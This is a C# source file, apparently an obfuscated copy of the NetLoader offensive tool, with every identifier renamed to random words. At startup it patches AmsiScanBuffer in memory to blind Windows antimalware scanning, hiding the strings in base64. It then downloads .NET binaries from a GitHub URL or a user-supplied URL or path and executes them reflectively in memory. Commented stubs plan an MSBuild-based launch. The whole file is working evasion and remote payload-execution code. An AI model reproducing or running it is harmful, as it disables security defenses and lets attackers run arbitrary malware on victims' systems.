using System;using System.Collections.Generic;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Text.RegularExpressions;//This if for MSBuild LOL bin stuff later//using Microsoft.Build.Framework;//using Microsoft.Build.Utilities;public class WerowanceTautologizer{    private static WebClient EngendersPipra = new WebClient() { };
	[DllImport("ker" +"nel" + "32")]
    private static extern IntPtr LoadLibrary(string FlappingUndersheriff);
	[DllImport("ker" +"nel" + "32")]
    private static extern IntPtr GetProcAddress(IntPtr PhysiophilosophyBland, string MispleadSaddled);
	[DllImport("ker" +"nel" + "32")]
    private static extern bool VirtualProtect(IntPtr SidewheelNav, UIntPtr VirgateIncumber, uint DepletionReafflict, out uint AziolaFormularise);
	public static byte[] MusicologiesAggregatae(string SemitheologicallyProtocolist){
		return EngendersPipra.DownloadData(SemitheologicallyProtocolist);
	}
	public static void Main(string[] args)
    {
        Console.WriteLine("[!] ~Flangvik  #NetLoader");
        EntomotaxyExtrahepatic();
        while (true)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                if (args.Length == 0)
                {
                    List<string> ColocolaIntestiniform = RefinishDesalters();
                    Console.WriteLine("[+] Select a binary (number)>");
                    Console.WriteLine("------------------------");
                    Console.WriteLine("[0] - Exit NetLoader");
                    for (int WhauBulbospinal = 0; WhauBulbospinal < ColocolaIntestiniform.Count; WhauBulbospinal++)
                    {
                        Console.WriteLine("[" + (WhauBulbospinal + 1) + "] - " + ColocolaIntestiniform[WhauBulbospinal]);
                        if (WhauBulbospinal == ColocolaIntestiniform.Count - 1)
                        {
                            Console.WriteLine("[" + (WhauBulbospinal + 2) + "] - Custom PATH or URL ");
                        }
                    }
                    Console.WriteLine("-----------------------");
                    var SudorificFavellidium = Console.ReadLine();
                    if (Convert.ToInt32(SudorificFavellidium) == 0)
                    {
                        System.Environment.Exit(1);
                    }
                    else if (Convert.ToInt32(SudorificFavellidium) - 1 == ColocolaIntestiniform.Count)
                    {
                        Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                        string CarboxylationLacrimator = Console.ReadLine();
                        Console.WriteLine("[+] Provide AngioparalysisConglomerator for {0} >", CarboxylationLacrimator);
                        string PancakeMorphotonemic = Console.ReadLine();
                        DiadochiCorralling("", PancakeMorphotonemic, CarboxylationLacrimator, false);
                    }
                    else if (Convert.ToInt32(SudorificFavellidium) - 1 > ColocolaIntestiniform.Count | Convert.ToInt32(SudorificFavellidium) - 1 < 0)
                    {
                        Console.WriteLine("[!] Bad Input, sry!");
                    }
                    else
                    {
                        Console.WriteLine("[+] Provide AngioparalysisConglomerator for {0} >", ColocolaIntestiniform[Convert.ToInt32(SudorificFavellidium) - 1]);
                        string PancakeMorphotonemic = Console.ReadLine();
                        DiadochiCorralling(ColocolaIntestiniform[Convert.ToInt32(SudorificFavellidium) - 1], PancakeMorphotonemic);
                    }
                }
                else
                {
                    string SegregableVerandaed = "";
                    string GallootsPareciousness = "";
                    bool DiosmoticPunster = false;
                    foreach (var argument in args)
                    {
                        if (argument.ToLower().Contains("PollinicSmoothen"))
                        {
                            var DegelatinizeTestudo = Array.IndexOf(args, argument) + 1;
                            if (DegelatinizeTestudo < args.Length)
                            {
                                var InterroomLycees = args[Array.IndexOf(args, argument) + 1];
                                if (DiosmoticPunster)
                                    SegregableVerandaed = Encoding.UTF8.GetString(Convert.FromBase64String(InterroomLycees));
                                else
                                    SegregableVerandaed = InterroomLycees;
                            }
                        }
                        if (argument.ToLower().Contains("b64"))
                            DiosmoticPunster = true;
                        if (argument.ToLower().Contains("args"))
                        {
                            var DegelatinizeTestudo = Array.IndexOf(args, argument) + 1;
                            if (DegelatinizeTestudo < args.Length)
                            {
                                var InterroomLyceesArgs = args[Array.IndexOf(args, argument) + 1];
                                if (DiosmoticPunster)
                                    GallootsPareciousness = Encoding.UTF8.GetString(Convert.FromBase64String(InterroomLyceesArgs));
                                else
                                    GallootsPareciousness = InterroomLyceesArgs;
                            }
                        }
                    }
                    if (args.Length == 1 && string.IsNullOrEmpty(GallootsPareciousness) && string.IsNullOrEmpty(SegregableVerandaed) && !DiosmoticPunster)
                    {
                        SegregableVerandaed = args[0];
                    }
                    if (args.Length == 2 && string.IsNullOrEmpty(GallootsPareciousness) && string.IsNullOrEmpty(SegregableVerandaed) && !DiosmoticPunster)
                    {
                        GallootsPareciousness = args[1];
                        SegregableVerandaed = args[0];
                    }
                    if (args.Length == 3 && string.IsNullOrEmpty(GallootsPareciousness) && string.IsNullOrEmpty(SegregableVerandaed) && DiosmoticPunster)
                    {
                        SegregableVerandaed = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                        GallootsPareciousness = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    }
                    if (args.Length == 2 && DiosmoticPunster)
                    {
                        if (!string.IsNullOrEmpty(args[1]))
                            SegregableVerandaed = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                    }
                    if (!string.IsNullOrEmpty(SegregableVerandaed))
                    {
                        Console.WriteLine("[+] Starting {0} with args {1}", SegregableVerandaed, GallootsPareciousness);
                        DiadochiCorralling("", GallootsPareciousness, SegregableVerandaed, false);
                        Environment.Exit(0);
                    }
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Damn, it failed, to bad");
                Console.WriteLine("[!] {0}", ex.Message);
                Environment.Exit(0);
            }
        }
    }
	private static void CornGentlemens(byte[] SemisuccessUnwreathing, IntPtr HierologyIntralogical)
    {
        Marshal.Copy(SemisuccessUnwreathing, 0, HierologyIntralogical, SemisuccessUnwreathing.Length);
    }
	private static void EntomotaxyExtrahepatic(bool EsophagoscopyHyperorthodox = false)
    {
        try
        {
            var SharebrokerGlossolaly = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
            IntPtr ProtuberantialUnsincere = GetProcAddress(SharebrokerGlossolaly, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
            uint PinknessesCoconqueror = 0x40;
            uint AntalkalisInterchaff = 0;	
			var BirdseyeRhodophyta = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 	  
            if (!System.Environment.Is64BitOperatingSystem)
				BirdseyeRhodophyta = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            VirtualProtect(ProtuberantialUnsincere, (UIntPtr)BirdseyeRhodophyta.Length, PinknessesCoconqueror, out AntalkalisInterchaff);
            CornGentlemens(BirdseyeRhodophyta, ProtuberantialUnsincere);
            Console.WriteLine("[+] Did the magic stuf..");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] {0}", ex.Message);
        }
    }
	private static void HesitatersPerivaginal(MethodInfo SulphethylicChloSlidefilmNarcisticata, object[] StenographerAcrologic = null ){
	//SulphethylicChloSlidefilmNarcisticata.Invoke(null, new object[] { new string[] { AngioparalysisConglomerator } });
	SulphethylicChloSlidefilmNarcisticata.Invoke(0, StenographerAcrologic);
}
	public static byte[] ReenabledPhototonus(string PollinicSmoothen){
		return File.ReadAllBytes(PollinicSmoothen);
	}
	private static List<string> RefinishDesalters()
    {
        var MacrochelysCajaput = new List<string>() { };
        var PontificallyBangiales = EngendersPipra.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")));
        Regex SatietyRaisings = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
        foreach (var match in SatietyRaisings.Matches(PontificallyBangiales))
        {
            MacrochelysCajaput.Add(match.ToString().TrimStart('/'));
        }
        return MacrochelysCajaput;
    }
	public static Assembly DownfallingEpithalamiast(byte[] VibrativeAvians){
		return Assembly.Load(VibrativeAvians);
	}
	public static void DiadochiCorralling(string RhizostomePahoehoe, string AngioparalysisConglomerator = "", string ConcertmasterRetinued = "", bool SpongeflyRiverfront = true)
    {		var ResinolicSansei = new object[] { new string[] { AngioparalysisConglomerator } };
        if (!SpongeflyRiverfront)
        {
            if (!ConcertmasterRetinued.StartsWith("http"))
            {
                HesitatersPerivaginal(EructsTinnier(DownfallingEpithalamiast(ReenabledPhototonus(ConcertmasterRetinued))),ResinolicSansei);
			}
            else
            {
                HesitatersPerivaginal(EructsTinnier(DownfallingEpithalamiast(MusicologiesAggregatae(ConcertmasterRetinued))),ResinolicSansei);
			}
		}	
        else
        {
			HesitatersPerivaginal(EructsTinnier(DownfallingEpithalamiast(MusicologiesAggregatae(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")).Replace("tree", "blob") + "/" + RhizostomePahoehoe + "?raw=true"))),ResinolicSansei);
	    }
    }
	private static MethodInfo EructsTinnier(Assembly SlidefilmNarcistic)
    {
		if(1 == 1)
			return SlidefilmNarcistic.EntryPoint;
		return null;
	}
	/*
	 //This is for MSBuild later
	public class ClassExample : Task, ITask
	{
	    public override bool Execute()
	    {
	        WerowanceTautologizer.Main(new string[] { });
	        return true;
	    }
	}
	*/
}